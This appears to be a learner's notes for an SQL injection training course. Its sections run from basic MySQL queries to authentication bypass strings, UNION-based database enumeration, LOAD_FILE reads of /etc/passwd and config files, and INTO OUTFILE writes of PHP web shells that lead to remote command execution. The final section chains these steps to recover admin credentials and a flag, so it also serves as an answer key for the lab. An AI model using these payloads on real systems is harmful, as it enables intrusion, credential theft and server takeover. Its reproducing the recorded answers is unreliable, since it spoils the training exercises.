# SQL Injection Fundamentals


# Intro to MySQL


```shell

mysql -u root -ppassword -h 83.136.252.165 -P 33756 

SHOW DATABASES;

```


# Sql Statements


```shell

select * from departments;

```

# Query Results

```shell
select last_name from employees where hire_date='1990-01-01';

```


# SQL Operatores

```shell

SELECT COUNT(*)
FROM titles
WHERE emp_no > 10000
   OR title NOT LIKE '%engineer%';


```
# SQL Operatores


Try to log in as the user 'tom'. What is the flag value shown after you successfully log in? 


```bash

tom' or '1'='1

something # can´t be the same username


```

# Using Comments

Login as the user with the id 5 to get the flag

```bash

' or id = 5 )#

somenting

```

# Union Clause

Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table. 


```bash

mysql -h 94.237.58.91 -P 40577 -u root -ppassword

show databases;

use employees

SELECT * FROM departments UNION SELECT emp_no,birth_date FROM employees;

```

# Union Injection

Use a Union injection to get the result of 'user()' 

```raw

cn' UNION select 1,@@version,3,4-- -

cn' UNION select 1,user(),3,4-- -

```

# Database Enumeration

What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database? 

```bash
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='DATABASE_NAME'-- -

cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='TABELS_NAME'-- -

cn' UNION select 1, username, password, 4 from DATABASE_NAME.TABELS_NAME-- -
cn' UNION select 1, username, password, 4 from ilfreight.users-- -

```

# Reading Files

We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password. 

```bash

cn' UNION SELECT 1, user(), 3, 4-- -

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
config.php

SELECT LOAD_FILE('/etc/passwd');

cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

# CTRL+u to see the php code in the page

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -

```

# Writing Files

Find the flag by using a webshell. 

apache

```bash

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

http://94.237.53.113:46435/shell.php?0=ls


```

# skill

Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. 

```bash

username: admin' or '1'='1' -- -
password: some

cn' UNION select 1,2,3,4,5-- -

cn' UNION select "",schema_name,"","","" from information_schema.schemata-- -

cn' UNION select "",table_name,"","","" from information_schema.tables where table_schema='backup'-- -

cn' UNION select "",table_name,column_name,"","" from information_schema.columns where table_schema='backup'-- -


cn' UNION select "",username,password,"","" from backup.admin_bk-- -

admin:Inl@n3_fre1gh7_adm!n

cn' UNION select "",'<?php system("dir /")?>',"","","" into outfile '/var/www/html/dashboard/dir.php'-- -

flag_cae1dadcd174.txt

cn' UNION select "",'<?php system("cat /flag_cae1dadcd174.txt")?>',"","","" into outfile '/var/www/html/dashboard/win.php'-- -



```


